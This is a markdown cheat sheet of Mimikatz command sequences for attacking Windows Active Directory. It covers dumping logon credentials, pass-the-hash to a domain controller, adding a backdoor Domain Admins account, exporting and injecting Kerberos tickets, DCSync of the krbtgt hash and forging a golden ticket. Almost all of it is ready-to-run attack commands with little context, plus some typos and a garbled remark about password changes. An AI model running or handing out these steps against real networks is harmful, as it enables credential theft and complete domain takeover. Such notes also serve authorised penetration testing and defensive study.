# MIMIKATZ

Mimikatz is a very powerfull tool for Windows privilege escalation, lateral movement, credential stuffing and more.

## Pass The Hash

From Local Admin to Domain Admin using Mimikatz and Pass The Hash

This requires a local admin account and that a domain admin to have an open session on the host.

Initial state:

```
cmd> powershell -ep bypass
PS> Enter-PSSession -ComputerName DC01

!!! FAIL !!!
```

Use mimikatz to pass the hash:

```
mimikatz # privilege::debug
mimikatz # token::whomai
mimikatz # log mimilog.txt
mimikatz # sekurlsa::logonpasswords

<view the mimilog.txt and find the ntlm hash>

mimikatz # sekurlsa::pth /user:domain_admin /domain:test.com /ntlm:2B576ACBE6BCFDA7294D6BD18041B8FE
cmd> powershell -ep bypass
PS> Enter-PSSession -ComputerName DC01
!!! SUCCESS !!!
CMD\Documents>whoami
CMD\Documents>hostname
CMD\Documents>exit
cmd> net user new.user Password123! /ADD /DOMAIN
cmd> net group "Domain Admins" new.user /ADD /DOMAIN
```

Voila! The new.user account is now domain admin.

---

## Pass The Ticket

Export and import a ticket using mimikatz

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt c:\users\..\[]admin@krbtgt.lab1.kirbi
mimikatz # exit
PS> klist
```

## Creating a Golden Ticket

From a ntds dump, it is possible to create a Golden Ticket. This is very, very dangerous as it requires 2x password change.

### Create a dump:

Need to run this on DC as domain admin:

```
mimikatz # lsadump::dcsync /user:krbtgt
```
### From that dump, create the golden ticket

Note your SID and get the hash:

```
C:\>whomai /user
<note the SID, without the last 4 digit RID>

C:\>python secretdump.py -ntds "C:\ntds.dit" -system "C:\ntds-dump\registry\SYSTEM" -outputfile "C:\hash.txt" LOCAL
```

Use mimikatz

```
mimikatz # privilege::debug
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:JohnDoe /id:500 /rc4:"<from hash.txt>" /sid:"<from prev cmd>" /domain:test.com /ptt
```
